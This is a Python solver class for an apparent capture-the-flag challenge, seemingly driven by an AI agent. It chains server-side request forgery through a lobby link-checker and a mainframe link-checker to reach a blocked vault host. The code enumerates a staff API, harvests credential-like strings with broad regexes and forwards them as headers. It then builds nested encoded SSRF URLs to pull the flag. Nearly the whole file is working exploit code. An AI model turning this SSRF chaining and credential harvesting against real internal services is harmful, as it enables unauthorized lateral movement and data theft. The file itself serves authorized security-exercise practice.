"""
Silph Co. Solver — nested SSRF chain (link-checker), NOT port scanning.

Only the lobby is reachable (network policy blocks direct mainframe/vault
connections). The exploit chains the lobby's link-checker into the mainframe's
link-checker into the vault:

  1. Enumerate lobby GET /api/staff/{id} (from 101 up) -> leaks mainframe key
  2. lobby /api/linkcheck?url=<mainframe>&header=<mainframe key> -> read mainframe,
     which leaks the vault token
  3. lobby /api/linkcheck?url=<ENC(mainframe /api/linkcheck?url=<ENC(vault /vault)>
     &header=<vault token>)>&header=<mainframe key> -> flag from the vault

Field/param names the challenge uses are not fully specified by the hints, so
the solver is instrumented (prints every response) and tries several likely
names. Diagnostics let us hand-tune a follow-up build if auto-detection misses.
"""
import re
import json
from urllib.parse import urlencode
from typing import Optional, List, Tuple, Dict, Any

import requests

FLAG_RE = re.compile(r"HALCTF\{[^}]+\}")

# Candidate query-param names for the header the link-checker forwards.
HEADER_PARAM_NAMES = ["header", "headers", "forward_header", "fwd_header", "x_header", "h"]
# Candidate paths for the link-checker on each host.
LINKCHECK_PATHS = ["/api/linkcheck", "/linkcheck", "/api/link-check"]
# Candidate ports for the lobby HTTP service.
LOBBY_PORTS = [80, 8080, 8000, 5000, 3000]


class SilphCoSolver:
    """Solves the Silph Co. nested-SSRF lateral movement challenge."""

    def __init__(self, agent):
        import os
        self.agent = agent
        self.lobby_ip = agent.silph_lobby_ip
        self.mainframe_ip = agent.silph_mainframe_ip
        self.vault_ip = agent.silph_vault_ip

        # Per-host ports (default 8080). Read directly; each host may differ.
        self.lobby_port = os.environ.get("HAL_TARGET_SILPH_LOBBY_PORT", "8080") or "8080"
        self.mainframe_port = os.environ.get("HAL_TARGET_SILPH_MAINFRAME_PORT", "8080") or "8080"
        self.vault_port = os.environ.get("HAL_TARGET_SILPH_VAULT_PORT", "8080") or "8080"

        print("Silph Co. hosts:", flush=True)
        print(f"  Lobby:     {self.lobby_ip}:{self.lobby_port}", flush=True)
        print(f"  Mainframe: {self.mainframe_ip}:{self.mainframe_port}", flush=True)
        print(f"  Vault:     {self.vault_ip}:{self.vault_port}", flush=True)

        # Resolved once we find a port that answers.
        self.lobby_base: Optional[str] = None
        self.lobby_linkcheck: Optional[str] = None
        self.header_param: Optional[str] = None

    # ---- low-level helpers -------------------------------------------------

    def _get(self, url: str, params: Optional[Dict[str, Any]] = None, timeout: float = 8.0):
        """GET with logging; returns Response or None."""
        try:
            resp = requests.get(url, params=params, timeout=timeout)
            body = resp.text
            preview = body[:600].replace("\n", " ")
            print(f"GET {resp.url} -> {resp.status_code} | {preview}", flush=True)
            return resp
        except Exception as e:
            print(f"GET {url} failed: {e}", flush=True)
            return None

    @staticmethod
    def _find_flag(text: str) -> Optional[str]:
        m = FLAG_RE.search(text or "")
        return m.group(0) if m else None

    # ---- discovery ---------------------------------------------------------

    def discover_lobby(self) -> bool:
        """Find a reachable lobby port and its link-checker endpoint."""
        if not self.lobby_ip:
            print("No lobby IP provided — cannot proceed", flush=True)
            return False

        # Prefer the injected lobby port, then common fallbacks.
        ports = []
        if str(self.lobby_port).isdigit():
            ports.append(int(self.lobby_port))
        ports += [p for p in LOBBY_PORTS if p not in ports]

        for port in ports:
            base = f"http://{self.lobby_ip}:{port}"
            resp = self._get(base + "/", timeout=2.5)
            if resp is not None:
                self.lobby_base = base
                print(f"Lobby reachable at {base}", flush=True)
                break

        if not self.lobby_base:
            print("Could not reach lobby on any candidate port", flush=True)
            return False

        # Confirm the link-checker path.
        for path in LINKCHECK_PATHS:
            resp = self._get(self.lobby_base + path, params={"url": "http://example.invalid"})
            if resp is not None and resp.status_code not in (404, 405):
                self.lobby_linkcheck = self.lobby_base + path
                print(f"Lobby link-checker: {self.lobby_linkcheck}", flush=True)
                return True

        # Fall back to the documented default even if probing was inconclusive.
        self.lobby_linkcheck = self.lobby_base + "/api/linkcheck"
        print(f"Assuming lobby link-checker: {self.lobby_linkcheck}", flush=True)
        return True

    def enumerate_staff(self, start: int = 101, count: int = 40) -> List[Dict]:
        """Read the lobby staff directory; return parsed records."""
        print(f"Enumerating lobby /api/staff/{start}..{start + count - 1}", flush=True)
        records = []
        for sid in range(start, start + count):
            resp = self._get(f"{self.lobby_base}/api/staff/{sid}")
            if resp is None or resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except Exception:
                data = {"_raw": resp.text}
            data["_id"] = str(sid)
            records.append(data)
        print(f"Collected {len(records)} staff records", flush=True)
        return records

    @staticmethod
    def _extract_credentials(records: List[Dict]) -> List[Tuple[str, str]]:
        """
        Pull candidate (header_name, header_value) pairs out of staff records.

        The 'record that should not be public' carries a credential. We don't
        know its exact shape, so we harvest anything credential-shaped:
        explicit header specs, auth/token/key fields, or Bearer strings.
        """
        creds: List[Tuple[str, str]] = []
        cred_key_re = re.compile(r"(auth|token|key|secret|cred|api|access|pass|clearance)", re.I)
        # Header spec anchored at start of a value ("X-Silph-Key: ABC").
        header_spec_re = re.compile(r"^([A-Za-z][\w-]*):\s*(.+)$")
        # Header spec embedded ANYWHERE in prose ("...trusts the old key
        # X-Silph-Key: SILPH-INTERNAL-7f3a9c2e"). Header-ish name + token value.
        embedded_header_re = re.compile(r"\b([A-Z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+)\s*:\s*([A-Za-z0-9_.\-]{4,})")
        bare_token_re = re.compile(r"^[A-Za-z0-9_.\-]{12,}$")

        def consider(value: str):
            value = value.strip()
            # 1) Embedded "Name: value" anywhere in the text (most common here).
            for m in embedded_header_re.finditer(value):
                creds.append((m.group(1), m.group(2)))
            # 2) Whole value is exactly a header spec.
            m = header_spec_re.match(value)
            if m:
                creds.append((m.group(1), m.group(2)))
            elif value.lower().startswith("bearer "):
                creds.append(("Authorization", value))
            elif bare_token_re.match(value):
                # Bare token with no explicit header name — try common carriers.
                creds.append(("Authorization", f"Bearer {value}"))
                creds.append(("X-API-Key", value))

        def walk(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if isinstance(v, str):
                        if cred_key_re.search(str(k)):
                            # header name might be the key itself, or Authorization
                            creds.append((str(k), v))
                            creds.append(("Authorization", f"Bearer {v}"))
                            consider(v)
                        else:
                            consider(v)
                    else:
                        walk(v)
            elif isinstance(obj, list):
                for item in obj:
                    walk(item)
            elif isinstance(obj, str):
                consider(obj)

        for rec in records:
            walk(rec)

        # De-dupe, preserve order.
        seen = set()
        uniq = []
        for pair in creds:
            if pair not in seen:
                seen.add(pair)
                uniq.append(pair)
        print(f"Extracted {len(uniq)} candidate credential header(s): {uniq}", flush=True)
        return uniq

    # ---- SSRF primitives ---------------------------------------------------

    def linkcheck(self, checker_url: str, target_url: str,
                  header: Optional[str] = None) -> Optional[requests.Response]:
        """
        Invoke a link-checker at `checker_url` to fetch `target_url`, optionally
        forwarding one header. Tries several header-param names on first use and
        remembers the one that works.
        """
        param_names = [self.header_param] if self.header_param else HEADER_PARAM_NAMES
        if header is None:
            resp = self._get(checker_url, params={"url": target_url})
            return resp

        for pname in param_names:
            resp = self._get(checker_url, params={"url": target_url, pname: header})
            if resp is not None and resp.status_code < 500:
                if self.header_param is None:
                    self.header_param = pname
                    print(f"Using header param name: '{pname}'", flush=True)
                return resp
        return None

    def _mainframe_linkcheck_urls(self, inner_target: str, inner_header: str, mf_port: str = "8080") -> List[str]:
        """
        Build the mainframe's own link-checker URL to nest inside the lobby's.

        The exact encoding the link-checkers expect is unknown, and getting it
        wrong is the single most likely reason the vault chain fails. So we
        return BOTH plausible forms and let the caller try each:

          1. percent-encoded query (urlencode) — correct if the lobby decodes
             the outer `url` param once before fetching (the usual case);
          2. raw query — correct if the lobby forwards `url` verbatim without
             decoding, so `requests`' own single encoding is all that's applied.

        Either way the lobby request is sent via requests' `params={"url": ...}`,
        which applies exactly one transport-level encoding on top.
        """
        # The mainframe's link-checker mirrors the lobby's: /api/linkcheck with a
        # 'header' param that forwards one "Name: value" header.
        pname = self.header_param or "header"
        root = f"http://{self.mainframe_ip}:{mf_port}/api/linkcheck"

        encoded = f"{root}?{urlencode({'url': inner_target, pname: inner_header})}"
        raw = f"{root}?url={inner_target}&{pname}={inner_header}"
        return [encoded, raw]

    # ---- orchestration -----------------------------------------------------

    @staticmethod
    def _unwrap(text: str) -> str:
        """
        The link-checker wraps the fetched response as {"status":N,"body":"..."}.
        Return the inner body if present, else the raw text — so credential and
        flag scanning see the actual proxied content.
        """
        try:
            obj = json.loads(text)
            if isinstance(obj, dict) and "body" in obj:
                return str(obj.get("body", ""))
        except Exception:
            pass
        return text or ""

    def solve(self) -> bool:
        print("=== Silph Co. Solver (nested SSRF) ===", flush=True)

        if not self.discover_lobby():
            return False

        lobby_linkcheck = self.lobby_linkcheck or ""
        mf_port = self.mainframe_port
        mainframe_root = f"http://{self.mainframe_ip}:{mf_port}"
        vault_url = f"http://{self.vault_ip}:{self.vault_port}/vault"

        # Step 1: leaked internal key is in the lobby staff directory. Scan a
        # generous range and pull any "Name: value" header spec out of the notes.
        print("Step 1: harvest internal key from lobby staff directory", flush=True)
        staff = self.enumerate_staff(start=101, count=30)
        creds = self._extract_credentials(staff)
        if not creds:
            print("No credential found in staff notes — cannot proceed", flush=True)
            return False
        print(f"Candidate internal keys: {creds}", flush=True)

        for mf_name, mf_val in creds:
            mf_header = f"{mf_name}: {mf_val}" if mf_name else mf_val
            print(f"\nStep 2: read mainframe via lobby SSRF, header='{mf_header}'", flush=True)

            # The mainframe exposes /api/records/{id} (ids from 1), NOT /api/staff.
            mf_bodies = []
            got_mainframe = False
            for rid in range(1, 16):
                resp = self.linkcheck(lobby_linkcheck, f"{mainframe_root}/api/records/{rid}", mf_header)
                if resp is None:
                    continue
                body = self._unwrap(resp.text)
                flag = self._find_flag(body)
                if flag:
                    print(f"Flag surfaced from mainframe record {rid}: {flag}", flush=True)
                    return self._submit(flag)
                # A 200 wrapper with a non-401 body means the key worked.
                if '"internal_key_required"' not in resp.text and "no_such" not in body.lower():
                    if body.strip():
                        got_mainframe = True
                        mf_bodies.append(body)

            if not got_mainframe:
                print("Mainframe not readable with this key — trying next candidate", flush=True)
                continue

            # Step 3: the vault token is leaked in the mainframe records. Extract
            # any header-spec credential from the mainframe bodies.
            vault_creds = self._extract_credentials([{"_raw": b} for b in mf_bodies])
            print(f"Candidate vault tokens: {vault_creds}", flush=True)
            if not vault_creds:
                # Fall back to reusing the internal key on the vault hop.
                vault_creds = [(mf_name, mf_val)]

            # Step 4: nested link-check. Outer request carries the internal key so
            # the lobby->mainframe hop is authorized; the inner (mainframe->vault)
            # request carries the vault token.
            for v_name, v_val in vault_creds:
                v_header = f"{v_name}: {v_val}" if v_name else v_val
                print(f"\nStep 4: nested SSRF to vault, vault header='{v_header}'", flush=True)
                for inner in self._mainframe_linkcheck_urls(vault_url, v_header or "", mf_port):
                    resp = self.linkcheck(lobby_linkcheck, inner, mf_header)
                    if resp is None:
                        continue
                    body = self._unwrap(resp.text)
                    flag = self._find_flag(body) or self._find_flag(resp.text)
                    if flag:
                        return self._submit(flag)

        print("Silph Co. chain did not yield a flag — check diagnostics above", flush=True)
        return False

    def _submit(self, flag: str) -> bool:
        print(f"FLAG FOUND: {flag}", flush=True)
        return self.agent.submit_flag(flag, self.agent.challenge_id)
